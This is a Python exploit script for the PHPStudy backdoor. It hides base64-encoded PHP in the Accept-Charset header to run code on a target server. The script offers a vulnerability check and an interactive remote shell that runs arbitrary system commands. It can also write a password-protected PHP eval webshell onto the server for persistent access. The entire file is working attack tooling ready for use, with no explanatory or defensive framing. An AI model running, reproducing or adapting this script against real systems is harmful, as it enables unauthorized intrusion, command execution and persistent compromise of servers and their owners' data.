import requests
import sys
import base64

if sys.version[0] == '2':
    input = raw_input

b64 = lambda s: base64.b64encode(s.encode())


def rce(url, c):
    h = {
        'Accept-Charset': b64(c).replace('/', '%2F'),
        'Accept-Encoding': 'gzip,deflate',
        'User-Agent': 'Mozilla/5.0 Firefox/68.0',
    }
    r = requests.get(url, headers=h, timeout=20)

    if sys.version[0] == '3':
        return r.text
    else:
        return r.content


def check_vuln(url):
    test_str = 'phpstudy-backdoor-test'
    result = rce(url, 'print_r("%s");' % test_str)
    return test_str in result


def command(url, c):
    result = rce(
        url,
        'print_r("--|>");' + 'system(\'{}\');'.format(c) + 'print_r("<|--");')
    i_s = result.find('--|>')
    i_e = result.find('<|--')
    if i_s == -1 or i_e == -1:
        raise Exception('something error')
    return result[i_s + 4:i_e]


def write_webshell(url, fname, pwd):
    write_cmd = ('file_put_contents(\'{}\', '
                 '\'<?php @eval($_REQUEST[{}]); ?>\');'.format(fname, pwd))
    rce(url, write_cmd)


def banner():
    print('\n./phpstudy_backdoor.py [check | command | shell] url\n\n'
          '* check: check if the target is vulnerable\n'
          '* cmd: interactive system shell\n'
          '* shell: write a php webshell in current directory\n')


try:
    subcommand = sys.argv[1]
    url = sys.argv[2]
except IndexError:
    banner()
    exit()

try:
    if subcommand == 'check':
        is_vuln = check_vuln(url)
        if is_vuln:
            print('[+]target is vulnerable')
        else:
            print('[+]seems not vulnerable')

    elif subcommand == 'cmd':
        while 1:
            cmd = input('backdoor@phpstudy $ ')
            print(command(url, cmd))

    elif subcommand == 'shell':
        file = input('input shell name with absolutely path: ')
        pwd = input('input shell password (default \'pass\'): ') or 'pass'
        write_webshell(url, file, pwd)
        print('[+]path: {}   password: {}'.format(file, pwd))
    else:
        banner()

except Exception as e:
    print('[!]%s' % e)
